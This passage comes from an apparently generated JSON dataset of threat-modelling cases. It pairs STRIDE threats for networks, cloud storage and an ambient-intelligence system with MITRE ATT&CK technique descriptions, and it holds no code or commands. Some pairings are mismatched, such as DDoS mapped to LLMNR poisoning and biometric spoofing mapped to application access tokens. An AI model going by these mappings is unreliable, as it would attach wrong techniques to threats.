                    "Condition": "Possesses packet sniffing tools."
                },
                {
                    "Assumption": "No additional layers of encryption are applied to sensitive data.",
                    "Role": "System Designer",
                    "Condition": "Relies on network encryption alone."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "packet sniffing",
                "wireless"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to cloud-stored data through compromised credentials.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are compromised through phishing or other means.",
                    "Role": "User/Attacker",
                    "Condition": "Falls for a phishing attack or similar tactic."
                },
                {
                    "Assumption": "Cloud storage does not have multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Implements weak authentication methods."
                },
                {
                    "Assumption": "No monitoring of unusual access patterns.",
                    "Role": "Security Team",
                    "Condition": "Lacks monitoring and anomaly detection."
                }
            ],
            "Potential Impact": "Data breaches and unauthorized access to sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud",
                "credential compromise"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data exposed through unprotected APIs.",
            "Assumptions": [
                {
                    "Assumption": "APIs do not require authentication or have weak authentication.",
                    "Role": "System Designer",
                    "Condition": "Implements insufficient API security."
                },
                {
                    "Assumption": "The attacker can identify and access unprotected APIs.",
                    "Role": "Attacker",
                    "Condition": "Uses API enumeration techniques."
                },
                {
                    "Assumption": "Sensitive data is directly accessible via these APIs.",
                    "Role": "System Designer",
                    "Condition": "Designs APIs exposing sensitive data without checks."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to data confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "API security",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack overwhelms the communication infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "The network has limited capacity to handle large amounts of traffic.",
                    "Role": "System Administrator",
                    "Condition": "Does not scale network capacity adequately."
                },
                {
                    "Assumption": "No DDoS protection mechanisms are in place.",
                    "Role": "System Administrator",
                    "Condition": "Lacks DDoS mitigation measures."
                },
                {
                    "Assumption": "The attacker can coordinate a large number of devices for the attack.",
                    "Role": "Attacker",
                    "Condition": "Has access to a botnet or similar resources."
                }
            ],
            "Potential Impact": "Service disruption, leading to loss of system availability and potential safety issues in automated environments.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection of user devices leads to system-wide service disruptions.",
            "Assumptions": [
                {
                    "Assumption": "User devices do not have up-to-date antivirus software.",
                    "Role": "User",
                    "Condition": "Fails to regularly update security software."
                },
                {
                    "Assumption": "Compromised devices can affect the entire network.",
                    "Role": "System Administrator",
                    "Condition": "Lacks network segmentation."
                },
                {
                    "Assumption": "The attacker has access to deploy malware widely.",
                    "Role": "Attacker",
                    "Condition": "Has means to distribute malware (e.g., email, external drives)."
                }
            ],
            "Potential Impact": "Widespread disruption of services, leading to downtime and potential data integrity issues due to malware actions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "user devices"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in the communication infrastructure leads to denial of service.",
            "Assumptions": [
                {
                    "Assumption": "Infrastructure components have known but unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Does not apply security patches promptly."
                },
                {
                    "Assumption": "The attacker is aware of and can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Follows security bulletins or uses vulnerability scanners."
                },
                {
                    "Assumption": "There is no fallback mechanism or redundancy in place.",
                    "Role": "System Designer",
                    "Condition": "Does not implement redundancy or failover mechanisms."
                }
            ],
            "Potential Impact": "Network failure resulting in a loss of data transmission capability, affecting overall system functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the system software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "There is a zero-day vulnerability present in the software.",
                    "Role": "Software Developer",
                    "Condition": "Unintentionally introduces a vulnerability."
                },
                {
                    "Assumption": "The attacker discovers the zero-day before it is patched.",
                    "Role": "Attacker",
                    "Condition": "Actively looks for exploitable vulnerabilities."
                },
                {
                    "Assumption": "The system lacks advanced security measures to detect and mitigate zero-day exploits.",
                    "Role": "System Administrator",
                    "Condition": "Does not use advanced threat detection systems."
                }
            ],
            "Potential Impact": "Compromise of data integrity and confidentiality, system manipulation, and full control of the environment by unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses spear phishing to obtain administrative credentials.",
            "Assumptions": [
                {
                    "Assumption": "Administrative staff are targets of spear phishing campaigns.",
                    "Role": "Attacker",
                    "Condition": "Identifies and crafts tailored phishing emails."
                },
                {
                    "Assumption": "Users can be deceived by sophisticated phishing attempts.",
                    "Role": "User",
                    "Condition": "Falls for well-crafted spear phishing emails."
                },
                {
                    "Assumption": "There are insufficient safeguards against credential misuse.",
                    "Role": "System Administrator",
                    "Condition": "Does not implement multi-factor authentication for high-privilege accounts."
                }
            ],
            "Potential Impact": "Full system compromise, allowing unauthorized access to all data and systems.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "spear phishing",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user leverages a misconfigured service to escalate privileges and gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "There are services running with excessive privileges.",
                    "Role": "System Administrator",
                    "Condition": "Misconfigures service permissions."
                },
                {
                    "Assumption": "Misconfigurations are not regularly audited.",
                    "Role": "Security Team",
                    "Condition": "Fails to perform regular configuration audits."
                },
                {
                    "Assumption": "The attacker has basic access to the system.",
                    "Role": "Attacker",
                    "Condition": "Gains initial access through legitimate or illegitimate means (e.g., compromised account)."
                }
            ],
            "Potential Impact": "Unauthorized access with high-level privileges, leading to potential data breaches and system control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfiguration",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a biometric input to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a high-resolution image of the user's fingerprint.",
                    "Role": "Attacker",
                    "Condition": "The attacker can intercept or obtain biometric data."
                },
                {
                    "Assumption": "The biometric scanner does not have anti-spoofing features.",
                    "Role": "System",
                    "Condition": "The biometric hardware is not equipped with liveness detection."
                },
                {
                    "Assumption": "The attacker has physical access to the biometric scanner.",
                    "Role": "Attacker",
                    "Condition": "The attacker can manipulate the scanner directly."
                }
            ],
            "Potential Impact": "Unauthorized access leading to data compromise.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric",
                "authentication",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake user device to spoof communication with the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can create a device with the same network identity as an authorized device.",
                    "Role": "Attacker",
                    "Condition": "The network identity can be replicated or hijacked."
                },
                {
                    "Assumption": "The communication protocol does not enforce mutual authentication.",
                    "Role": "System",
                    "Condition": "The application does not verify both parties' identities robustly."
                },
                {
                    "Assumption": "The attacker can connect to the same network as the target device.",
                    "Role": "Attacker",
                    "Condition": "The attacker is in proximity or has network access."
                }
            ],
            "Potential Impact": "Impersonation of a user device, leading to unauthorized control of environment settings.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "communication",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs credentials to gain access to the cloud-based data repository.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to stolen passwords or tokens.",
                    "Role": "Attacker",
                    "Condition": "User credentials are compromised or weak."
                },
                {
                    "Assumption": "The data repository does not enforce multi-factor authentication.",
                    "Role": "System",
                    "Condition": "Authentication relies solely on single-factor credentials."
                },
                {
                    "Assumption": "The attacker can reach the cloud service endpoint.",
                    "Role": "Attacker",
                    "Condition": "The attacker has network connectivity to the service."
                }
            ],
            "Potential Impact": "Data breach and loss of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "credentials",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious data into the communication between sensors and the central controller.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is unencrypted.",
                    "Role": "System",
                    "Condition": "Data is transmitted in plaintext."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "The attacker can eavesdrop or intercept data."
                },
                {
                    "Assumption": "The system does not verify the integrity of incoming data.",
                    "Role": "System",
                    "Condition": "No checksumming or signing of data packets."
                }
            ],
            "Potential Impact": "Misleading system behavior and incorrect environment adaptations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "injection",
                "communication",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the firmware of an actuator to perform unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's device can upload firmware updates.",
                    "Role": "Attacker",
                    "Condition": "Firmware update process is not secure."
                },
                {
                    "Assumption": "There is no firmware signature verification.",
                    "Role": "System",
                    "Condition": "The system does not authenticate firmware."
                },
                {
                    "Assumption": "The actuator accepts updates from unauthorized sources.",
                    "Role": "System",
                    "Condition": "Firmware policy is not strictly enforced."
                }
            ],
            "Potential Impact": "Compromised actuator functionality affecting safety and performance.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "actuator",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies stored user profiles to alter personalized settings.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has database access.",
                    "Role": "Attacker",
                    "Condition": "Database access is compromised or poorly protected."
                },
                {
